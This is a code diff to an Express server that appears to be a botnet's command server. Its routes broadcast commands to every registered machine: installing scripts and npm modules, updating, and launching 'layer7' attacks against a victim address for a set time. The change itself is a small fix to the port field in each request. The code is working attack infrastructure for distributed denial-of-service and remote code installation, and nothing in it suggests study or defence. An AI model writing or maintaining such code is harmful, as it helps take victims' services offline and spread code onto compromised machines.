@@ -441,8 +441,7 @@ app.get('/all/installscript/:scriptid', async (req, res) => {
     for (let index = 0; index < (machines.all).length; index++) {
         let currentMachine = ((machines.all)[index])
         machines.asked.push(currentMachine)
-        console.log(currentMachine);
-        axios.get(`http://${currentMachine.id}:${currentMachine.port}/installScript/${req.params.scriptid}`)
+        axios.get(`http://${currentMachine.id}:${currentMachine.machine.port}/installScript/${req.params.scriptid}`)
             .then(res => {
                 console.log(res.data)
                 machines.responded.push(currentMachine)
@@ -466,7 +465,7 @@ app.get('/all/npminstall/:module', async (req, res) => {
     for (let index = 0; index < (machines.all).length; index++) {
         let currentMachine = ((machines.all)[index])
         machines.asked.push(currentMachine)
-        await axios.get(`http://${currentMachine.id}:${currentMachine.port}/npminstall/${req.params.module}`)
+        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port}/npminstall/${req.params.module}`)
             .then(res => {
                 console.log(res.data)
                 machines.responded.push(currentMachine)
@@ -489,7 +488,7 @@ app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) 
     for (let index = 0; index < (machines.all).length; index++) {
         let currentMachine = ((machines.all)[index])
         machines.asked.push(currentMachine)
-        await axios.get(`http://${currentMachine.id}:${currentMachine.port}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
+        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
             .then(res => {
                 console.log(res.data)
                 machines.responded.push(currentMachine)
@@ -512,7 +511,7 @@ app.get('/all/update', async (req, res) => {
     for (let index = 0; index < (machines.all).length; index++) {
         let currentMachine = ((machines.all)[index])
         machines.asked.push(currentMachine)
-        await axios.get(`http://${currentMachine.id}:${currentMachine.port}/update`)
+        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port}/update`)
             .then(res => {
                 console.log(res.data)
                 machines.responded.push(currentMachine)
@@ -546,7 +545,7 @@ app.get('/machines/testReachability/', async (req, res) => {
     for (let index = 0; index < (machines.all).length; index++) {
         let currentMachine = ((machines.all)[index])
         machines.asked.push(currentMachine)
-        await axios.get(`http://${currentMachine.id}:${currentMachine.port}/status`)
+        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port}/status`)
             .then(res => {
                 console.log(res.data)
                 machines.responded.push(currentMachine)
